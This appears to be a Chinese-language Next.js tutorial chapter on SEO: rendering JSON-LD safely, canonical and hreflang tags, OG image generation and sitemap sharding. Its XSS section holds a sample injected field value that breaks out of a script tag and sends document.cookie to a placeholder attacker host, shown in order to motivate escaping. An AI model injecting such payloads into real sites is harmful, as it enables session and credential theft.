# 25 · SEO 与 JSON-LD

> **一句话结论**：JSON-LD 用**原生 `<script type="application/ld+json">`** 标签渲染在组件里，**不要用 `next/script`**——那是为可执行 JS 优化的，而 JSON-LD 是数据不是代码。注入时必须把 `<` 转义成 `\u003c`，否则用户可以往页面里注入脚本。

## 最小可运行示例

```tsx
// app/products/[id]/page.tsx
export default async function Page({
  params,
}: {
  params: Promise<{ id: string }>
}) {
  const { id } = await params
  const product = await getProduct(id)

  const jsonLd = {
    '@context': 'https://schema.org',
    '@type': 'Product',
    name: product.name,
    image: product.image,
    description: product.description,
  }

  return (
    <section>
      <script
        type="application/ld+json"
        // 关键：把 < 转义，防止 XSS
        dangerouslySetInnerHTML={{
          __html: JSON.stringify(jsonLd).replace(/</g, '\\u003c'),
        }}
      />
      <h1>{product.name}</h1>
    </section>
  )
}
```

`type="application/ld+json"` 的 `<script>` 是**数据块**，浏览器不会执行它，搜索引擎和 AI 会解析它。

## 为什么不用 `next/script`

`next/script` 是为「加载并执行第三方 JavaScript」设计的——它有加载策略、去重、`onLoad` 回调这一整套机制。JSON-LD 不需要任何一项：

| | `<script type="application/ld+json">` | `next/script` |
|---|---|---|
| 是否执行 | 否，纯数据 | 是 |
| 需要加载策略 | 不需要 | 需要 |
| 是否需要 `src` | 否 | 通常需要 |
| 是否需要 `id` | 否 | 内联脚本需要 |
| 服务端渲染 | 直接在 HTML 里 | 有额外的注入逻辑 |

用原生标签，代码更短，语义更准。

## 类型安全：`schema-dts`

手写 JSON-LD 对象容易拼错字段名（`@type` 写成 `type`，`name` 写成 `title`）。社区包 `schema-dts` 提供了完整的 TypeScript 类型，`WithContext<T>` 会自动补上 `@context` 字段：

```tsx
// app/products/[id]/page.tsx
import type { Product, WithContext } from 'schema-dts'

const jsonLd: WithContext<Product> = {
  '@context': 'https://schema.org',
  '@type': 'Product',
  name: 'Next.js Sticker',
  image: 'https://nextjs.org/imgs/sticker.png',
  description: 'Dynamic at the speed of static.',
  offers: {
    '@type': 'Offer',
    price: '10.00',
    priceCurrency: 'CNY',
    availability: 'https://schema.org/InStock',
  },
}
```

这样字段拼错、类型不对都会在编译期报错。

### 常见类型

| `@type` | 用途 | 关键字段 |
|---|---|---|
| `Organization` | 公司 / 组织信息 | `name`、`url`、`logo`、`sameAs` |
| `WebSite` | 站点信息 | `name`、`url`、`potentialAction` |
| `BreadcrumbList` | 面包屑 | `itemListElement` |
| `Article` / `BlogPosting` | 文章 | `headline`、`datePublished`、`author` |
| `Product` | 商品 | `name`、`offers`、`aggregateRating` |
| `FAQPage` | 常见问题 | `mainEntity` |
| `Person` | 人物 | `name`、`jobTitle`、`sameAs` |

## XSS：为什么必须转义

`JSON.stringify` **不做 HTML 转义**。考虑这段用户可控的数据：

```ts
// 攻击者可控的字段值
const jsonLd = {
  '@context': 'https://schema.org',
  '@type': 'Product',
  name: '</script><script>fetch("https://evil.example/steal?c="+document.cookie)</script>',
}
```

如果直接 `JSON.stringify(jsonLd)` 塞进 `__html`，浏览器看到的是：

```html
<script type="application/ld+json">{"name":"</script><script>fetch(...)</script>"}</script>
```

第一个 `</script>` 会**提前结束**数据块，后面的内容被当作真正的可执行脚本。这就是一个完整的 XSS。

解法是把 `<` 替换成 JSON 的 Unicode 转义 `\u003c`。`\u003c` 在 JSON 里就是 `<`，所以解析出来的数据完全一样——只是 HTML 解析器不再把它识别为标签边界。

实际项目里把它抽成一个可复用组件，顺带转义 `U+2028` / `U+2029`（它们在 JS 字符串里是行终止符）：

```tsx
// app/lib/json-ld.tsx
export function JsonLd<T extends Record<string, unknown>>({ data }: { data: T }) {
  return (
    <script
      type="application/ld+json"
      dangerouslySetInnerHTML={{
        __html: JSON.stringify(data)
          .replace(/</g, '\\u003c')
          .replace(/\u2028/g, '\\u2028')
          .replace(/\u2029/g, '\\u2029'),
      }}
    />
  )
}
```

```tsx
// app/products/[id]/page.tsx
import { JsonLd } from '@/app/lib/json-ld'

export default async function Page({
  params,
}: {
  params: Promise<{ id: string }>
}) {
  const { id } = await params
  const product = await getProduct(id)

  return (
    <section>
      <JsonLd
        data={{
          '@context': 'https://schema.org',
          '@type': 'Product',
          name: product.name,
          image: product.image,
          description: product.description,
        }}
      />
      <h1>{product.name}</h1>
    </section>
  )
}
```

如果团队有更严格的要求，可以用 `serialize-javascript` 之类的库替代 `JSON.stringify`。

### 校验工具

| 工具 | 用途 |
|---|---|
| [Rich Results Test](https://search.google.com/test/rich-results) | Google 的富媒体结果测试 |
| [Schema Markup Validator](https://validator.schema.org/) | 通用的 schema.org 校验 |

## 常见结构化数据组合

### 站点级：`WebSite` + `Organization`

放在根布局，全站生效。`sameAs` 是「同一实体的其他主页」，用来把分散在各平台的账号关联到同一个组织实体上：

```tsx
// app/layout.tsx
import { JsonLd } from '@/app/lib/json-ld'

const siteUrl = 'https://acme.com'

export default function RootLayout({
  children,
}: {
  children: React.ReactNode
}) {
  return (
    <html lang="zh-CN">
      <body>
        <JsonLd
          data={{
            '@context': 'https://schema.org',
            '@type': 'WebSite',
            name: 'Acme',
            url: siteUrl,
            potentialAction: {
              '@type': 'SearchAction',
              target: `${siteUrl}/search?q={search_term_string}`,
              'query-input': 'required name=search_term_string',
            },
          }}
        />
        <JsonLd
          data={{
            '@context': 'https://schema.org',
            '@type': 'Organization',
            name: 'Acme',
            url: siteUrl,
            logo: `${siteUrl}/logo.png`,
            sameAs: ['https://github.com/acme', 'https://x.com/acme'],
          }}
        />
        {children}
      </body>
    </html>
  )
}
```

### 面包屑

`position` 必须从 1 开始且连续，否则校验不通过。数据来源应与可见的面包屑 UI 保持一致：

```tsx
// app/blog/[slug]/page.tsx
const jsonLd = {
  '@context': 'https://schema.org',
  '@type': 'BreadcrumbList',
  itemListElement: [
    { '@type': 'ListItem', position: 1, name: '首页', item: 'https://acme.com' },
    { '@type': 'ListItem', position: 2, name: '博客', item: 'https://acme.com/blog' },
    { '@type': 'ListItem', position: 3, name: slug, item: `https://acme.com/blog/${slug}` },
  ],
}
```

### 文章

```tsx
// app/blog/[slug]/page.tsx
import type { BlogPosting, WithContext } from 'schema-dts'
import { JsonLd } from '@/app/lib/json-ld'

export default async function Page({
  params,
}: {
  params: Promise<{ slug: string }>
}) {
  const { slug } = await params
  const post = await getPost(slug)

  const jsonLd: WithContext<BlogPosting> = {
    '@context': 'https://schema.org',
    '@type': 'BlogPosting',
    headline: post.title,
    image: post.cover,
    datePublished: post.publishedAt,
    dateModified: post.updatedAt,
    author: { '@type': 'Person', name: post.authorName, url: post.authorUrl },
    publisher: {
      '@type': 'Organization',
      name: 'Acme',
      logo: { '@type': 'ImageObject', url: 'https://acme.com/logo.png' },
    },
  }

  return (
    <>
      <JsonLd data={jsonLd} />
      <article>{post.title}</article>
    </>
  )
}
```

`datePublished` 和 `dateModified` 用 ISO 8601 格式，和 `generateMetadata` 里 `openGraph.publishedTime` 保持同一个值。

## canonical 与多区域 SEO

canonical 解决的是**重复内容**问题：同一个页面可能通过多个 URL 访问（带查询串、带尾斜杠、走不同域名），搜索引擎需要知道哪个是「正主」。

```tsx
// app/blog/[slug]/page.tsx
import type { Metadata } from 'next'

export async function generateMetadata({
  params,
}: {
  params: Promise<{ slug: string }>
}): Promise<Metadata> {
  const { slug } = await params

  return {
    // 用 metadataBase 拼成绝对 URL
    alternates: {
      canonical: `/blog/${slug}`,
      languages: {
        'zh-CN': `/zh-CN/blog/${slug}`,
        'en-US': `/en-US/blog/${slug}`,
        'x-default': `/blog/${slug}`,
      },
    },
  }
}
```

```tsx
// app/layout.tsx
export const metadata: Metadata = {
  metadataBase: new URL('https://acme.com'),
}
```

产出：
```html
<link rel="canonical" href="https://acme.com/blog/post-1" />
<link rel="alternate" hreflang="zh-CN" href="https://acme.com/zh-CN/blog/post-1" />
<link rel="alternate" hreflang="en-US" href="https://acme.com/en-US/blog/post-1" />
<link rel="alternate" hreflang="x-default" href="https://acme.com/blog/post-1" />
```

### 多区域 SEO 的三条规则

1. **每个语言版本都要有完整的 hreflang 集合，包括指向自己的那一条。** 只写「其他语言」是常见错误。
2. **`x-default` 是必填的兜底。** 它告诉搜索引擎「语言没匹配上时给这个版本」，通常指向默认语言或语言选择页。
3. **canonical 必须自指。** `/zh-CN/blog/post-1` 的 canonical 应该是它自己，而不是默认语言的版本——否则中文页面会被判定为重复内容并从索引里移除。

### 域名级多区域

如果每个区域用独立域名（`acme.com`、`acme.de`、`acme.jp`），hreflang 要写完整域名，并在 `next.config.ts` 里为每个域名配置重定向，或按 Host 头在 proxy 里分流（见第 17、26 章）：

```tsx
// app/layout.tsx
export const metadata: Metadata = {
  metadataBase: new URL('https://acme.com'),
  alternates: {
    languages: {
      'zh-CN': 'https://acme.cn',
      'en-US': 'https://acme.com',
      'de-DE': 'https://acme.de',
      'x-default': 'https://acme.com',
    },
  },
}
```

### 避免常见重复内容来源

| 来源 | 处理 |
|---|---|
| 带查询串的分页（`?page=2`） | 分页页各自 canonical 到自己，不要都指向第一页 |
| 尾斜杠变体 | 用 `trailingSlash` 统一，或让重定向收敛 |
| 大小写变体 | 在 proxy 里做规范化重定向 |
| 打印版 / 移动版 | canonical 指向主版本 |
| UTM 参数 | canonical 忽略查询串 |

```tsx
// app/blog/page.tsx
export async function generateMetadata({
  searchParams,
}: {
  searchParams: Promise<{ page?: string }>
}): Promise<Metadata> {
  const { page } = await searchParams
  const current = Number(page ?? 1)

  return {
    // 分页页 canonical 到自己，保留 page 参数
    alternates: { canonical: current === 1 ? '/blog' : `/blog?page=${current}` },
  }
}
```

## 动态 OG 图的生成策略

第 24 章讲了 `opengraph-image.tsx` 的写法，这里讲**策略**。

### 按数据源选方案

| 场景 | 方案 | 代价 |
|---|---|---|
| 全站统一一张图 | 静态 `app/opengraph-image.jpg` | 零成本 |
| 少量模板 + 变量文案 | `ImageResponse` + `params` | 每张图一次渲染 |
| 设计稿由设计师产出 | 静态图 + 按目录覆盖 | 人工维护 |
| 用户上传的封面 | 直接用用户图，不走生成 | 取决于存储 |

### 静态化的边界

`opengraph-image.tsx` 默认**在构建期静态生成并缓存**——除非它使用请求时 API 或未缓存数据。配合 `generateStaticParams`，所有文章的 OG 图会在构建时一次生成完：

```tsx
// app/blog/[slug]/opengraph-image.tsx
import { ImageResponse } from 'next/og'
import { getPost } from '@/app/lib/data'

export const size = { width: 1200, height: 630 }

// 所有文章的 OG 图在构建时全部生成好
export async function generateStaticParams() {
  const posts = await getPosts()
  return posts.map((post) => ({ slug: post.slug }))
}

export default async function Image({
  params,
}: {
  params: Promise<{ slug: string }>
}) {
  const { slug } = await params
  // getPost 若走的是被缓存的 fetch，这里就是构建期完成
  const post = await getPost(slug)

  return new ImageResponse(
    (<div style={{ display: 'flex', fontSize: 64 }}>{post.title}</div>),
    { ...size }
  )
}
```

**代价**：文章多的时候构建时间会显著拉长，每篇都要跑一次 satori 渲染。文章量上千时，考虑改成按需生成（加请求时 API 让它变成动态），或把 OG 图生成挪到独立服务。

### 字体必须内联

`ImageResponse` 在服务端渲染，**不能引用 `next/font` 或 CSS 里的字体**。必须把字体文件读成 `ArrayBuffer` 显式传进去，否则中文会渲染成方块：

```tsx
// app/blog/[slug]/opengraph-image.tsx
import { ImageResponse } from 'next/og'
import { readFile } from 'node:fs/promises'
import { join } from 'node:path'

// 模块作用域读一次，不要放在函数里每次请求都读
const notoSans = await readFile(join(process.cwd(), 'assets/NotoSansSC-Bold.ttf'))

export default async function Image() {
  return new ImageResponse(
    (<div style={{ display: 'flex', fontSize: 64 }}>中文标题</div>),
    {
      width: 1200,
      height: 630,
      fonts: [{ name: 'Noto Sans SC', data: notoSans, style: 'normal', weight: 700 }],
    }
  )
}
```

中文字体文件动辄几 MB，建议做**子集化**——只保留实际用到的字符，能把文件压到几十 KB。

## sitemap 分片策略

Google 的硬限制是**单个 sitemap 最多 50,000 条 URL，未压缩不超过 50MB**。超过就得拆。

### 三种分片方式

| 方式 | 写法 | 适用 |
|---|---|---|
| 按路由段 | 多个 `sitemap.ts` 放在不同目录 | 内容天然按板块划分 |
| `generateSitemaps` | 一个文件返回 `[{ id: 0 }, { id: 1 }, ...]` | 同一类内容量大，需要按序号切 |
| 两者混用 | 板块 + 序号 | 超大站点 |

### 按路由段分片

```
app/
├─ sitemap.ts              → /sitemap.xml          （首页、静态页）
├─ blog/sitemap.ts         → /blog/sitemap.xml     （文章）
└─ products/sitemap.ts     → /products/sitemap.xml （商品）
```

```ts
// app/blog/sitemap.ts
import type { MetadataRoute } from 'next'

export default async function sitemap(): Promise<MetadataRoute.Sitemap> {
  const posts = await getPosts()

  return posts.map((post) => ({
    url: `https://acme.com/blog/${post.slug}`,
    lastModified: post.updatedAt,
    changeFrequency: 'monthly',
    priority: 0.7,
  }))
}
```

这种方式的好处是每个板块独立缓存和重新验证，改一个板块不影响其他。

### 按序号分片

```ts
// app/product/sitemap.ts
import type { MetadataRoute } from 'next'

const PER_SITEMAP = 50000

export async function generateSitemaps() {
  const total = await countProducts()
  const shards = Math.ceil(total / PER_SITEMAP)

  return Array.from({ length: shards }, (_, id) => ({ id }))
}

export default async function sitemap(props: {
  id: Promise<string>
}): Promise<MetadataRoute.Sitemap> {
  // id 是 Promise<string>，必须 await 后再转数字
  const id = await props.id
  const start = Number(id) * PER_SITEMAP

  const products = await getProducts(start, PER_SITEMAP)

  return products.map((product) => ({
    url: `https://acme.com/product/${product.id}`,
    lastModified: product.updatedAt,
  }))
}
```

生成 `/product/sitemap/0.xml`、`/product/sitemap/1.xml`……见 [`MIGRATION-16.md`](../../MIGRATION-16.md) 第 7 条。

### 索引 sitemap

分片之后需要一个索引告诉搜索引擎有哪些分片。用 `robots.ts` 的 `sitemap` 字段（接受字符串数组，生成多行 `Sitemap:` 指令）：

```ts
// app/robots.ts
import type { MetadataRoute } from 'next'

export default function robots(): MetadataRoute.Robots {
  return {
    rules: { userAgent: '*', allow: '/' },
    sitemap: [
      'https://acme.com/sitemap.xml',
      'https://acme.com/blog/sitemap.xml',
      'https://acme.com/products/sitemap.xml',
    ],
  }
}
```

### 分片策略的取舍

| 决策 | 建议 |
|---|---|
| 什么时候开始分片 | URL 接近 50,000 条，或单个 sitemap 构建耗时超过几秒 |
| 分片粒度 | 按内容类型分（语义清晰）优于纯按序号分（实现简单） |
| `lastModified` 的准确性 | 用真实的内容更新时间，不要统一填 `new Date()` |
| `priority` | 只在同一 sitemap 内做相对比较，不要跨站比较，也不影响排名本身 |
| 多语言 | 用 `alternates.languages`，不要为每个语言单独做一份 sitemap |

> **`lastModified` 填 `new Date()` 是常见错误**。它会让搜索引擎认为每次请求内容都变了，长期会降低对这个字段的信任。用数据库里的真实更新时间。

## 常见坑

- **现象**：JSON-LD 里的用户内容把页面搞崩了，出现了非预期的脚本执行。
  **原因**：`JSON.stringify` 不做 HTML 转义，内容里的 `</script>` 提前结束了数据块。
  **解法**：`.replace(/</g, '\\u003c')`，或统一走一个 `JsonLd` 组件。

- **现象**：`Rich Results Test` 报「缺少必填字段」，但页面上看着没问题。
  **原因**：结构化数据里字段名拼错，或必填字段确实缺失（如 `Product` 缺 `offers`）。
  **解法**：用 `schema-dts` 做类型检查，并用校验工具逐条核对。

- **现象**：多语言站点的中文页面从搜索结果里消失了。
  **原因**：中文页面的 canonical 指向了默认语言版本，被判定为重复内容。
  **解法**：canonical 自指，每个语言版本指向自己。

- **现象**：hreflang 写了但没有生效。
  **原因**：缺少自指的那一条，或缺少 `x-default`。
  **解法**：hreflang 集合必须包含指向自己的链接，且必须有 `x-default` 兜底。

- **现象**：OG 图里的中文全是方块，或者每次请求都读一次字体文件导致接口很慢。
  **原因**：`ImageResponse` 无法使用 `next/font` 或 CSS 字体，必须显式传入字体文件；而 `readFile` 若写在函数体内就会每次请求都读。
  **解法**：读字体文件为 `ArrayBuffer` 通过 `fonts` 选项传入，把 `readFile` 放在模块作用域，并做字体子集化控制体积。

- **现象**：文章量上千之后构建时间暴涨。
  **原因**：`generateStaticParams` 让每篇文章的 OG 图都在构建期渲染。
  **解法**：改成按需生成，或把 OG 图生成拆到独立服务。

- **现象**：sitemap 里的 `lastModified` 每次请求都是当前时间。
  **原因**：写了 `new Date()`。
  **解法**：用内容真实的更新时间字段。

- **现象**：sitemap 分片后搜索引擎只抓到了第一片。
  **原因**：没有索引 sitemap 或没有在 `robots.ts` 里列出所有分片。
  **解法**：在 `robots.ts` 的 `sitemap` 字段里列出全部分片地址。

- **现象**：`generateSitemaps` 返回的分片数量变了之后，旧分片的 URL 还在被爬。
  **原因**：分片 URL 由 `id` 决定，数量减少后旧 URL 变成 404。
  **解法**：这是正常的，404 会让搜索引擎逐渐移除。避免频繁变动分片数量。

## API / 配置速查

| 项 | 写法 | 说明 |
|---|---|---|
| JSON-LD 注入 | `<script type="application/ld+json" dangerouslySetInnerHTML={{ __html }} />` | 原生标签 |
| XSS 转义 | `JSON.stringify(data).replace(/</g, '\\u003c')` | 必需 |
| 类型包 | `schema-dts` | `WithContext<T>` |
| canonical | `alternates.canonical` | 配合 `metadataBase` 用相对路径 |
| hreflang | `alternates.languages` | 需自指 + `x-default` |
| sitemap 索引 | `robots.ts` 的 `sitemap: string[]` | 列出所有分片 |
| OG 图字体 | `ImageResponse` 的 `fonts` 选项 | 必须显式传入 |

| 校验工具 | 地址 |
|---|---|
| Rich Results Test | https://search.google.com/test/rich-results |
| Schema Markup Validator | https://validator.schema.org/ |

| 限制 | 数值 |
|---|---|
| 单个 sitemap URL 上限 | 50,000 |
| 单个 sitemap 体积上限 | 50MB（未压缩） |
| `twitter-image` 体积上限 | 5MB |
| `opengraph-image` 体积上限 | 8MB |

## 延伸阅读

- [官方文档：JSON-LD 指南](https://nextjs.org/docs/app/guides/json-ld)
- [官方文档：generateMetadata](https://nextjs.org/docs/app/api-reference/functions/generate-metadata)
- [官方文档：sitemap.xml](https://nextjs.org/docs/app/api-reference/file-conventions/metadata/sitemap)
- [官方文档：ImageResponse](https://nextjs.org/docs/app/api-reference/functions/image-response)
- [Google：富媒体搜索结果测试](https://search.google.com/test/rich-results)
- [Google：hreflang 最佳实践](https://developers.google.com/search/docs/specialty/international/localized-versions)
- [schema.org 完整类型列表](https://schema.org/docs/full.html)
